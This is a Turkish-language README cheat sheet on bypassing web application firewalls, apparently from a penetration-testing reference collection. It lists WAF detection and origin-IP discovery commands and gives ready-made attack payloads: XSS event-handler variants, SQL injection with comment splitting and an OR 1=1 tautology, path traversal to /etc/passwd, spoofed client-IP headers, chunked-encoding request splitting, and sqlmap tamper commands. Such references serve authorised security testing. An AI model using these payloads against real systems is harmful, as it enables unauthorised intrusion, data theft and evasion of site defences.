# 🛡️ WAF Atlatma (WAF Bypass) Başvuru Kılavuzu

[🇬🇧 English](../../README.md)

```
  ██╗    ██╗ █████╗ ███████╗    ██████╗ ██╗   ██╗██████╗  █████╗ ███████╗███████╗
  ██║    ██║██╔══██╗██╔════╝    ██╔══██╗╚██╗ ██╔╝██╔══██╗██╔══██╗██╔════╝██╔════╝
  ██║ █╗ ██║███████║█████╗      ██████╔╝ ╚████╔╝ ██████╔╝███████║███████╗███████╗
  ██║███╗██║██╔══██║██╔══╝      ██╔══██╗  ╚██╔╝  ██╔═══╝ ██╔══██║╚════██║╚════██║
  ╚███╔███╔╝██║  ██║██║         ██████╔╝   ██║   ██║     ██║  ██║███████║███████║
   ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝         ╚═════╝    ╚═╝   ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝
   Web Application Firewall Bypass
```

---

## 🎯 WAF Atlatma Nedir?

**WAF (Web Application Firewall - Web Uygulama Güvenlik Duvarı)**, HTTP trafiğini inceleyerek SQL Enjeksiyonu, XSS, dosya dahil etme gibi bilinen saldırı kalıplarını engelleyen bir güvenlik katmanıdır. **WAF Atlatma (Bypass)** teknikleri ise iki ana yaklaşımla bu engelleri aşmayı hedefler:
1. **Gerçek Kaynak IP Adresini (Origin IP) Bulmak:** Doğrudan sunucuya bağlanarak WAF'ı tamamen devre dışı bırakmak.
2. **Payload Kodlama ve İstek Manipülasyonu:** WAF imza ve denetim kurallarını atlatacak şekilde saldırı yükünü modifiye etmek.

### Yaygın WAF Çözümleri
- Cloudflare, AWS WAF, Akamai, Imperva / Incapsula, ModSecurity, F5 BIG-IP ASM, Fortinet FortiWeb, Sucuri.

---

## 🔍 WAF Tespiti (WAF Detection)

### wafw00f ile Otomatik Tespit
```bash
# Hedefte WAF var mı ve hangi marka?
wafw00f https://target.com

# Ayrıntılı çıktı ile
wafw00f https://target.com -v

# Tüm WAF imzalarını deneyerek kapsamlı tarama
wafw00f https://target.com -a
```

### Manuel Başlık Analizi
```bash
curl -I https://target.com

# İncelenecek başlıklar:
# Server: cloudflare
# cf-ray: ...
# X-Sucuri-ID / X-Sucuri-Cache
# X-CDN: Incapsula
```

---

## 🌐 Gerçek Kaynak IP (Origin IP) Tespiti

Bulut WAF (Cloudflare vb.) arkasındaki gerçek sunucu IP adresi bulunursa, doğrudan IP'ye istek atılarak WAF kuralları %100 atlatılabilir.

### 1. Geçmiş DNS Kayıtları (DNS History)
Alan adı Cloudflare'e taşınmadan önceki eski A kayıtları gerçek sunucuyu gösterebilir:
- SecurityTrails, ViewDNS.info, CompleteDNS.

```bash
# SecurityTrails API sorgusu
curl "https://api.securitytrails.com/v1/history/target.com/dns/a" -H "APIKEY: YOUR_KEY"
```

### 2. SSL/TLS Sertifika Araması (Censys & crt.sh)
Gerçek sunucu üzerinde alan adının SSL sertifikası yüklüyse Censys veya Shodan bunu indekslemiş olabilir:
```bash
# Censys CLI ile sertifika taraması
censys search "parsed.names: target.com"

# Shodan üzerinde SSL Subject CN araması
shodan search Ssl.cert.subject.CN:"target.com" --fields ip_str
```

### 3. E-posta Başlıkları (Mail Headers)
Siteden kendinize bir parola sıfırlama, bülten veya aktivasyon e-postası gönderin. Gelen e-postanın kaynak kodundaki başlıkları inceleyin:
```http
Received: from [GERCEK_SUNUCU_IP]
X-Originating-IP: [GERCEK_SUNUCU_IP]
```

### 4. CDN Dışında Kalan Alt Alan Adları
Ana site CDN arkasındayken geliştiriciler bazı alt alan adlarını doğrudan sunucuya bağlamış olabilir:
```
mail.target.com, ftp.target.com, dev.target.com, staging.target.com, api-internal.target.com, vpn.target.com
```

### 5. Favicon Hash ile Arama
```bash
# Favicon MurmurHash değerini hesaplama
python3 -c "import mmh3,requests,codecs; print(mmh3.hash(codecs.encode(requests.get('https://target.com/favicon.ico').content,'base64')))"

# Shodan'da bu ikon hash'ine sahip tüm sunucuları bulma
shodan search "http.favicon.hash:HESAPLANAN_HASH"
```

---

## 🔓 Payload Kodlama ve Biçimlendirme ile Atlatma

### URL ve Çift Kodlama (Double Encoding)
```
# Tekli Kodlama:
<script> → %3Cscript%3E

# Çift Kodlama (Sunucu WAF'tan sonra tekrar decode ediyorsa):
<script> → %253Cscript%253E
```

### Karışık Harf Büyüklüğü (Case Manipulation)
```
<script> → <ScRiPt>
SELECT   → SeLeCt
UNION    → UnIoN
```

### Yorum Satırları ile Kelime Bölme
```sql
# SQL anahtar kelimelerini bölme:
SEL/**/ECT
UNION/**/SELECT
UN/**/ION/**/SE/**/LECT

# MySQL sürüm yorumları (WAF engelini aşar, MySQL çalıştırır):
/*!50000SELECT*/ * FROM users
```

### Boşluk Karakteri Alternatifleri
```sql
# Tab (%09), Yeni Satır (%0A), Satır Başı (%0D):
SELECT%09*FROM%09users
SELECT%0A*FROM%0Ausers
UNION+SELECT
1'+OR+1=1--
```

---

## 🔥 Zafiyet Bazlı WAF Atlatma Örnekleri

### XSS Atlatma Varyasyonları
`<script>` etiketi engellendiğinde olay yakalayıcılar (Event Handlers) kullanılır:

```html
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<video src=x onerror=alert(1)>
<details open ontoggle=alert(1)>

# Parantez kullanmadan (Backtick ile):
<img src=x onerror=alert`1`>

# 'alert' kelimesi engellendiğinde:
<img src=x onerror=confirm(1)>
<img src=x onerror=prompt(1)>
<img src=x onerror=eval('ale'+'rt(1)')>
```

### Dizin Gezinimi (Path Traversal) Atlatma
```
../../../../etc/passwd
..%2F..%2F..%2Fetc/passwd
..%252F..%252F..%252Fetc/passwd
....//....//....//etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
```

---

## 🛠️ HTTP Düzeyinde Atlatma Teknikleri

### Sahte Kaynak IP Başlıkları (IP Spoofing Headers)
Bazı WAF'lar yerel veya güvenilen IP'leri denetimden muaf tutar:
```http
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
```

### Parçalı Kodlama (Chunked Transfer Encoding)
HTTP/1.1'deki `Transfer-Encoding: chunked` başlığı sayesinde istek gövdesi parçalar halinde gönderilerek WAF'ın içerik bütünlüğünü analiz etmesi engellenebilir:

```http
POST /login HTTP/1.1
Host: target.com
Transfer-Encoding: chunked

4
user
4
=adm
2
in
0
```

### SQLMap Tamper Scriptleri
```bash
# SQLMap ile WAF atlatıcı betikleri devreye alma:
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,randomcase,between
```

---

## 📊 Hızlı Başvuru Tablosu

| Yöntem | Ne Zaman Kullanılır? |
|--------|----------------------|
| **Origin IP Bulma** | Cloudflare / Akamai gibi bulut WAF'larını tamamen devre dışı bırakmak için |
| **Yorum Satırları** | `UNION` ve `SELECT` gibi kelimeleri engelleyen WAF'lara karşı |
| **Büyük/Küçük Harf** | Basit regex filtrelerini atlatmak için |
| **HTML Entity & Hex** | XSS yüklerinin algılanmasını önlemek için |
| **Chunked Encoding** | Derin paket incelemesi yapan donanımsal WAF'lara karşı |

---

<p align="center">
  <b>🛡️ WAF'ları Aşın, Zafiyetleri Doğrulayın ve Sistemleri Güçlendirin!</b><br>
  <i>Yalnızca yasal yetkilendirme kapsamında test yapınız.</i>
</p>
